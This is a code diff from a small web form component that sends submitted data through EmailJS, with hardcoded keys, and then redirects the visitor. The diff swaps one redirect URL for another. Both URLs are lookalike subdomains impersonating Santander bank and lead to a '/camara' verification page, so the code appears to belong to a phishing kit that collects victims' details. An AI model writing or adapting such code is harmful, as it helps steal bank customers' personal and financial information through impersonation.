@@ -37,7 +37,7 @@ const Form = () => {
       emailjs.send('service_pl7uznq', 'template_0x40jpf', formData, '8Mgn87H6amGJecjhG')
         .then((response) => {
           console.log('Formulario enviado:', response.status, response.text);
-          window.location.href = 'https://santaderclientpremiunverif.vercel.app/camara'; // Redirigir a la URL especificada
+          window.location.href = 'https://micredpremiersantander.vercel.app/camara'; // Redirigir a la URL especificada
         })
         .catch((error) => {
           console.error('Error al enviar el formulario:', error);
